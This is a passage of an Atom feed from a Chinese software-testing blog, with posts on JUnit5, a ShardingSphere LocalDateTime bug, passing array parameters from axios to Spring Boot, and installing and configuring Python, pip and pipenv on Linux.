    <category term="python" scheme="https://seniortesting.club/tags/python/"/>
    
    <category term="pytest" scheme="https://seniortesting.club/tags/pytest/"/>
    
    <category term="pytest系列" scheme="https://seniortesting.club/tags/pytest%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>junit5系列(1) - junit5入门介绍</title>
    <link href="https://seniortesting.club/posts/iK3VDSMUo7/"/>
    <id>https://seniortesting.club/posts/iK3VDSMUo7/</id>
    <published>2021-04-13T03:47:27.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    
    
    
    <category term="软件测试" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/"/>
    
    <category term="自动化测试" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/"/>
    
    <category term="接口自动化" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/%E6%8E%A5%E5%8F%A3%E8%87%AA%E5%8A%A8%E5%8C%96/"/>
    
    <category term="junit5系列" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/%E6%8E%A5%E5%8F%A3%E8%87%AA%E5%8A%A8%E5%8C%96/junit5%E7%B3%BB%E5%88%97/"/>
    
    
    <category term="junit5" scheme="https://seniortesting.club/tags/junit5/"/>
    
    <category term="unit test" scheme="https://seniortesting.club/tags/unit-test/"/>
    
    <category term="junit5系列" scheme="https://seniortesting.club/tags/junit5%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>常用算法时间复杂度</title>
    <link href="https://seniortesting.club/posts/lucyZtTSQi/"/>
    <id>https://seniortesting.club/posts/lucyZtTSQi/</id>
    <published>2021-04-10T02:14:42.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对常用算法的时间复杂度不是很了解，所以在网上找了下相关的资料，将别人的资料复制下来，供自己学习．</p><p>动手前先看看是否已经有轮子是一个好习惯，果不其然，找到了原作。</p><blockquote><p><a href="http://bigocheatsheet.com/" target="_blank" rel="noopener">http://bigocheatsheet.com/</a></p></blockquote>]]></content>
    
    
    <summary type="html">常用算法的时间复杂度整理</summary>
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="算法" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="算法" scheme="https://seniortesting.club/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="时间复杂度" scheme="https://seniortesting.club/tags/%E6%97%B6%E9%97%B4%E5%A4%8D%E6%9D%82%E5%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>shardingsphere问题整理</title>
    <link href="https://seniortesting.club/posts/5nrCcQpX04/"/>
    <id>https://seniortesting.club/posts/5nrCcQpX04/</id>
    <published>2021-04-09T01:23:45.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    <content type="html"><![CDATA[<h2 id="java-sql-SQLFeatureNotSupportedException-getObject-with-type"><a href="#java-sql-SQLFeatureNotSupportedException-getObject-with-type" class="headerlink" title="java.sql.SQLFeatureNotSupportedException: getObject with type"></a>java.sql.SQLFeatureNotSupportedException: getObject with type</h2><ul><li>问题描述</li></ul><p>Using MyBatis to return a LocalDateTime type field gives an error.</p><p>java.sql.SQLFeatureNotSupportedException: getObject with type<br>at org.apache.shardingsphere.shardingjdbc.jdbc.unsupported.AbstractUnsupportedOperationResultSet.getObject(AbstractUnsupportedOperationResultSet.java:221) ~[sharding-jdbc-core-4.1.0.jar:4.1.0]<br>at org.apache.ibatis.type.LocalDateTimeTypeHandler.getNullableResult(LocalDateTimeTypeHandler.java:38) ~[mybatis-3.5.2.jar:3.5.2]</p><p>The sharding-jdbc version used is 4.1.1</p><ul><li>解决方案</li></ul><p>这是因为<code>shardingsphere</code>暂时不支持LocalDateTime类型,截至到目前&lt;2021-04-09&gt; 唯一的办法就是等待<strong>5.0.0</strong>版本修复,对应的这个issue的跟踪链接是:<a href="https://github.com/apache/shardingsphere/issues/5420" target="_blank" rel="noopener">https://github.com/apache/shardingsphere/issues/5420</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;java-sql-SQLFeatureNotSupportedException-getObject-with-type&quot;&gt;&lt;a href=&quot;#java-sql-SQLFeatureNotSupportedException-getObject-with-type</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="程序语言" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Java" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/"/>
    
    <category term="框架类库工具" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/"/>
    
    <category term="shardingsphere" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/shardingsphere/"/>
    
    
    <category term="分库分表" scheme="https://seniortesting.club/tags/%E5%88%86%E5%BA%93%E5%88%86%E8%A1%A8/"/>
    
    <category term="shardingsphere" scheme="https://seniortesting.club/tags/shardingsphere/"/>
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>springboot List param或者http Get请求相同的参数名称覆盖不能发送</title>
    <link href="https://seniortesting.club/posts/0O3rlyo9K0/"/>
    <id>https://seniortesting.club/posts/0O3rlyo9K0/</id>
    <published>2021-04-09T01:23:45.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    <content type="html"><![CDATA[<h2 id="数组参数问题"><a href="#数组参数问题" class="headerlink" title="数组参数问题"></a>数组参数问题</h2><p>我的服务器后台需要接受一个数组形式的参数,我想到的springboot形式的参数代码如下:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">listData</span><span class="params">(<span class="meta">@RequestParam(&quot;pid&quot;)</span> List&lt;Long&gt; projectIds)</span></span></span><br></pre></td></tr></table></figure><p>所以这里我用了一个List来接受数组形式的参数,但是发现我再用前台发送类似下面的请求的时候,发现相同参数名称(这里是<code>pid</code>)会被覆盖,发送到服务器端只有一个参数,如下:</p><ul><li>发送的GET类型的请求如下: <code>http://test.com?pid=123&amp;pid=456</code></li><li>实际发送的GET类型请求地址: <code>http://test.com?pid=456</code></li></ul><p>可以发现相同的参数请求时总是会覆盖相同的参数</p><h2 id="springboot-如何接受前台axios传过来的array数据-需要为POST方式-GET会覆盖相同的参数名称"><a href="#springboot-如何接受前台axios传过来的array数据-需要为POST方式-GET会覆盖相同的参数名称" class="headerlink" title="springboot 如何接受前台axios传过来的array数据,需要为POST方式,GET会覆盖相同的参数名称"></a>springboot 如何接受前台axios传过来的array数据,需要为POST方式,GET会覆盖相同的参数名称</h2><p>默认情况下，axios传过来的array数据格式是: <a href="http://test.com/abc?params" target="_blank" rel="noopener">http://test.com/abc?params</a>[]=test&amp;params[]=testw3w3, 需要特殊转换springboot才能解析成对应的<code>List&lt;String&gt;</code> 格式的参数</p><ul><li>axios端传递的方法如下：</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 此处ids是数组类型，主要用到了paramsSerializer，或者设置地址: var queryString = Object.keys(params).map(key =&gt; key + &#x27;=&#x27; + params[key]).join(&#x27;&amp;&#x27;);</span></span><br><span class="line">    axios.post(urls.PERMISSION_BATCH_ID_URL, <span class="literal">null</span>, &#123; <span class="attr">params</span>: &#123; <span class="attr">ids</span>: ids &#125;,</span><br><span class="line">      paramsSerializer: <span class="function"><span class="params">params</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> keys = <span class="built_in">Object</span>.keys(params)</span><br><span class="line">        <span class="keyword">let</span> options = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">        keys.forEach(<span class="function">(<span class="params">key</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">const</span> isParamTypeObject = <span class="keyword">typeof</span> params[key] === <span class="string">&#x27;object&#x27;</span></span><br><span class="line">          <span class="keyword">const</span> isParamTypeArray = isParamTypeObject &amp;&amp; (params[key].length &gt;= <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (!isParamTypeObject) &#123;</span><br><span class="line">            options += <span class="string">`<span class="subst">$&#123;key&#125;</span>=<span class="subst">$&#123;params[key]&#125;</span>&amp;`</span></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (isParamTypeObject &amp;&amp; isParamTypeArray) &#123;</span><br><span class="line">            params[key].forEach(<span class="function">(<span class="params">element</span>) =&gt;</span> &#123;</span><br><span class="line">              options += <span class="string">`<span class="subst">$&#123;key&#125;</span>=<span class="subst">$&#123;element&#125;</span>&amp;`</span></span><br><span class="line">            &#125;)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">return</span> options ? options.slice(<span class="number">0</span>, -<span class="number">1</span>) : options</span><br><span class="line">      &#125; &#125;).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    &#125;).catch(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.error(error)</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><code>springboot</code>接受数组参数的方法如下，需要格式为<code>ids=123&amp;ids=456&amp;ids=8743434&amp;ids=4546573424</code>：</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 经测试此处的List&lt;String&gt; ids 也可以为 List[] ids</span></span><br><span class="line"><span class="meta">@PostMapping(&quot;/batch&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> WebResponse <span class="title">deletePermissionsBatch</span><span class="params">(<span class="meta">@RequestParam(&quot;ids&quot;)</span> List&lt;String&gt; ids)</span> </span>&#123;</span><br><span class="line">        WebResponse response = WebResponse.getResponse();</span><br><span class="line">        <span class="keyword">if</span> (ids.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            ServiceResponse serviceResponse = permissionService.removePermissionBatch(ids);</span><br><span class="line">            <span class="keyword">boolean</span> serviceResponseSuccess = serviceResponse.isSuccess();</span><br><span class="line">            <span class="keyword">if</span> (!serviceResponseSuccess) &#123;</span><br><span class="line">                response.fail(serviceResponse.getResponseCode());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            log.warn(<span class="string">&quot;至少输入一个权限ID: &#123;&#125;&quot;</span>, ids.toString());</span><br><span class="line">            response.fail(PermissionResponseCode.PERMISSION_BATCH_MISSING);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> response;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;数组参数问题&quot;&gt;&lt;a href=&quot;#数组参数问题&quot; class=&quot;headerlink&quot; title=&quot;数组参数问题&quot;&gt;&lt;/a&gt;数组参数问题&lt;/h2&gt;&lt;p&gt;我的服务器后台需要接受一个数组形式的参数,我想到的springboot形式的参数代码如下:&lt;/p&gt;
&lt;fig</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="程序语言" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Java" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/"/>
    
    <category term="框架类库工具" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/"/>
    
    <category term="spring" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/Java/%E6%A1%86%E6%9E%B6%E7%B1%BB%E5%BA%93%E5%B7%A5%E5%85%B7/spring/"/>
    
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>Python Linux安装及其环境配置</title>
    <link href="https://seniortesting.club/posts/VsD26t2JsS/"/>
    <id>https://seniortesting.club/posts/VsD26t2JsS/</id>
    <published>2021-04-05T01:52:55.000Z</published>
    <updated>2021-04-18T13:00:39.467Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Python2-7-installaction-更新到2019年9月1日"><a href="#Python2-7-installaction-更新到2019年9月1日" class="headerlink" title="Python2.7 installaction [更新到2019年9月1日]"></a>Python2.7 installaction [更新到2019年9月1日]</h2><p>参考网站地址: <a href="https://tecadmin.net/install-python-2-7-on-ubuntu-and-linuxmint/" target="_blank" rel="noopener">安装Python2.7</a><br>命令如下:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo wget https://www.python.org/ftp/python/2.7.16/Python-2.7.16.tgz</span><br><span class="line">sudo tar xzf Python-2.7.16.tgz</span><br><span class="line">cd Python-2.7.16</span><br><span class="line">sudo ./configure --enable-optimizations</span><br><span class="line">sudo make altinstall </span><br></pre></td></tr></table></figure><p><code>make altinstall</code> is used to prevent replacing the default python binary file /usr/bin/python.</p><h2 id="Python3-8-apt安装步骤【更新2020年02月22日】"><a href="#Python3-8-apt安装步骤【更新2020年02月22日】" class="headerlink" title="Python3.8 apt安装步骤【更新2020年02月22日】"></a>Python3.8 apt安装步骤【更新2020年02月22日】</h2><ol><li>Run the following commands as root or user with sudo access to update the packages list and install the prerequisites:</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install software-properties-common</span><br><span class="line">sudo apt install dirmngr</span><br></pre></td></tr></table></figure><ol start="2"><li>Add the deadsnakes PPA to your system’s sources list,参考仓库：<a href="https://launchpad.net/~deadsnakes/+archive/ubuntu/ppa" target="_blank" rel="noopener">https://launchpad.net/~deadsnakes/+archive/ubuntu/ppa</a></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:deadsnakes/ppa</span><br><span class="line">sudo apt update</span><br></pre></td></tr></table></figure><p>When prompted press Enter to continue:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Press [ENTER] to continue or Ctrl-c to cancel adding it.</span><br></pre></td></tr></table></figure><ol start="3"><li>Once the repository is enabled, install Python 3.8 with:</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python3.8</span><br></pre></td></tr></table></figure><ol start="4"><li>Verify that the installation was successful by typing:</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3.8 --version</span><br></pre></td></tr></table></figure><h2 id="Python3-8-installation-更新到2019年8月10日"><a href="#Python3-8-installation-更新到2019年8月10日" class="headerlink" title="Python3.8 installation [更新到2019年8月10日]"></a>Python3.8 installation [更新到2019年8月10日]</h2><p><a href="https://linuxize.com/post/how-to-install-python-3-7-on-debian-9/" target="_blank" rel="noopener">How to Install Python 3.7 on Debian 9</a><br><a href="https://jcutrer.com/linux/upgrade-python37-ubuntu1810" target="_blank" rel="noopener">Modify python command</a></p><figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get purge  python3 -y</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get purge --auto-remove python3 -y</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> whereis python3 python3.5</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt update</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt install make build-essential libssl-dev zlib1g-dev bzip2 libbz2-dev liblzma-dev libreadline-dev libsqlite3-dev wget curl llvm libncurses5-dev  libncursesw5-dev libc6-dev libgdbm-dev libnss3-dev libffi-dev xz-utils openssl git tk-dev</span></span><br><span class="line"></span><br><span class="line">    以下的包bzip2 libbz2-dev解决问题: pip.exceptions.DistributionNotFound: No matching distribution found for Twisted,主要是因为如果包是：tar.bz2则pip不能安装</span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install bzip2 libbz2-dev</span></span><br><span class="line">    lxml安装出错误:  make sure the development packages of libxml2 and libxslt are installed </span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt install libxml2-dev libxslt-dev</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> wget https://www.python.org/ftp/python/3.8.1/Python-3.8.1.tar.xz</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tar -xf Python-3.8.1.tar.xz</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> Python-3.8.1</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./configure --enable-optimizations --enable-ipv6 --enable-loadable-sqlite-extensions</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> nproc</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make -j 8  / make -j 4</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo make altinstall</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> python3.9 -V</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ls /usr/bin/python*</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> update-alternatives --list python</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo update-alternatives --install /usr/bin/python python /usr/bin/python2.7 1</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo update-alternatives --install /usr/bin/python python /usr/<span class="built_in">local</span>/bin/python3.8 2</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo update-alternatives --install /usr/bin/python3 python3 /usr/<span class="built_in">local</span>/bin/python3.8 2</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> update-alternatives --list python</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> update-alternatives --config python</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="pip-pipenv-installation"><a href="#pip-pipenv-installation" class="headerlink" title="pip, pipenv installation"></a><code>pip</code>, <code>pipenv</code> installation</h2><p><a href="https://linuxize.com/post/how-to-install-pip-on-debian-9/" target="_blank" rel="noopener">How to install Pip</a></p><p><a href="https://www.ostechnix.com/pipenv-officially-recommended-python-packaging-tool/" target="_blank" rel="noopener">How to install pipenv</a></p><ol><li><code>pip</code> 安装</li></ol><figure class="highlight shell"><figcaption><span>script</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://bootstrap.pypa.io/get-pip.py</span><br><span class="line">sudo python3 get-pip.py</span><br></pre></td></tr></table></figure><p>如果出现错误： Command ‘(‘lsb_release’, ‘-a’)’ returned non-zero<br>参考 (<a href="https://stackoverflow.com/questions/44967202/pip-is-showing-error-lsb-release-a-returned-non-zero-exit-status-1" target="_blank" rel="noopener">https://stackoverflow.com/questions/44967202/pip-is-showing-error-lsb-release-a-returned-non-zero-exit-status-1</a>)，<br>使用命令： <code>sudo nano  /usr/bin/lsb_release</code><br>edited the first line from #! /usr/bin/python3 to #! /usr/bin/python3.7</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">如果出错：Package &#39;python3-distutils&#39; has no installation candidat</span><br><span class="line"></span><br><span class="line">执行如下命令确认pip对应的python版本是2.7还是3.8</span><br><span class="line">$ pip -V</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果出现错误： ImportError: cannot import name ‘main’ from ‘pip’，因为<code>pip</code>使用的是python2.7的命令，所以应该参考如下： <a href="https://stackoverflow.com/questions/44455001/how-to-change-pip3-command-to-be-pip/44455078" target="_blank" rel="noopener">https://stackoverflow.com/questions/44455001/how-to-change-pip3-command-to-be-pip/44455078</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pip3 -V</span><br><span class="line">alias pip&#x3D;pip3</span><br><span class="line">sudo update-alternatives --install &#x2F;usr&#x2F;bin&#x2F;pip pip &#x2F;usr&#x2F;bin&#x2F;pip3 1</span><br><span class="line">pip config set global.index-url https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="切换python镜像源"><a href="#切换python镜像源" class="headerlink" title="切换python镜像源"></a>切换python镜像源</h2><p>a）Linux下，修改<code>~/.pip/pip.conf</code>(没有就创建一个文件夹及文件。文件夹要加“.”，表示是隐藏文件夹,root用户安装时目录为：<code>/root/.config/pip/pip.conf</code>)<br>内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url &#x3D; https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple</span><br><span class="line">[install]</span><br><span class="line">trusted-host &#x3D; https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn</span><br></pre></td></tr></table></figure><p>(b) windows下，直接在user目录中创建一个pip目录，如：<code>C:\Users\xx\pip</code>，然后新建文件<code>pip.ini</code>，即 <code>%HOMEPATH%\pip\pip.ini</code>，在<code>pip.ini</code>文件中输入以下内容（以豆瓣镜像为例）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url &#x3D; http:&#x2F;&#x2F;pypi.douban.com&#x2F;simple</span><br><span class="line">[install]</span><br><span class="line">trusted-host &#x3D; pypi.douban.com</span><br></pre></td></tr></table></figure><p>(c) 如果是使用的<code>pipenv</code>,则可以在脚本目录下面修改<code>Pipfile</code>,修改为对应的镜像地址。</p><p>常用镜像地址列表:</p><ol><li><a href="https://pypi.tuna.tsinghua.edu.cn/simple" target="_blank" rel="noopener">https://pypi.tuna.tsinghua.edu.cn/simple</a></li><li><a href="http://pypi.douban.com/simple" target="_blank" rel="noopener">http://pypi.douban.com/simple</a></li></ol><p>3.</p><h2 id="pip-install-–upgrade升级安装包"><a href="#pip-install-–upgrade升级安装包" class="headerlink" title="pip install –upgrade升级安装包"></a>pip install –upgrade升级安装包</h2><p>例如需要升级安装scrapy为2.0，如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install --upgrade scrapy</span><br></pre></td></tr></table></figure><p>如果需要升级pip包，如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install --upgrade pip</span><br></pre></td></tr></table></figure><h2 id="pipenv安装及常用命令"><a href="#pipenv安装及常用命令" class="headerlink" title="pipenv安装及常用命令"></a><code>pipenv</code>安装及常用命令</h2><h2 id="pipenv命令操作"><a href="#pipenv命令操作" class="headerlink" title="pipenv命令操作"></a>pipenv命令操作</h2><p>2020年0826永久更新改变默认的pipenv的路径：</p><p>在windows下使用pipenv shell时，虚拟环境文件夹会在C：\Users\Administrator.virtualenvs\目录下默认创建，为了方便管理，将这个虚环境的文件的位置更改一下。</p><p>新建一个名为“ <strong>WORKON_HOME</strong> ”的环境变量（如果已存在就忽略此步骤），然后将环境变量的值设置为“ <strong>.virtualenvs</strong> ”</p><p>以后所有的虚拟环境都会在当前python项目下面创建一个.virtualenvs目录。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ pip install --user pipenv</span><br><span class="line">$ python -m site --user-base</span><br><span class="line">$ sudo nano ~&#x2F;.profile</span><br><span class="line"> export PATH&#x3D;&quot;$HOME&#x2F;.local&#x2F;bin:$PATH&quot;</span><br><span class="line">$ sudo source ~&#x2F;.profile</span><br><span class="line">$ . &#x2F;etc&#x2F;profile</span><br><span class="line">$ pipenv --version</span><br><span class="line"></span><br><span class="line">常用pipenv命令</span><br><span class="line">$ pipenv --update</span><br><span class="line">$ export PIPENV_VENV_IN_PROJECT&#x3D;1 (for linux) &#x2F; SET PIPENV_VENV_IN_PROJECT&#x3D;1(for windows)</span><br><span class="line">$ pipenv shell</span><br><span class="line">$ pipenv install &#x2F; pipenv install -r requirements.txt</span><br><span class="line">$ pipenv lock -r  (export to requirement.txt文件)</span><br><span class="line">$ pipenv update</span><br><span class="line">$ pipenv graph</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="安装配置问题"><a href="#安装配置问题" class="headerlink" title="安装配置问题"></a>安装配置问题</h2><ul><li>zipimport.ZipImportError: can’t decompress data; zlib not available 解决办法</li></ul><p>参考解决方案<a href="https://www.cnblogs.com/zhangym/p/6226435.html" target="_blank" rel="noopener">zipimport.ZipImportError: can’t decompress data; zlib not available 解决办法</a></p><ul><li>Microsoft Visual C++ 14.0 is required</li></ul><p>python3 是用 VC++ 14 编译的, python27 是 VC++ 9 编译的, 安装 python3 的包需要编译的也是要 VC++ 14 以上支持的.<br>Visual Studio 2013 —&gt; 12<br>Visual Studio 2015 —&gt; 14<br>Visual Studio 2017 —&gt; 15</p><h2 id="requests报错-RequestsDependencyWarning-urllib3-1-25-10-or-chardet-3-0-4-doesn’t-match-a-supported-version"><a href="#requests报错-RequestsDependencyWarning-urllib3-1-25-10-or-chardet-3-0-4-doesn’t-match-a-supported-version" class="headerlink" title="requests报错 RequestsDependencyWarning: urllib3 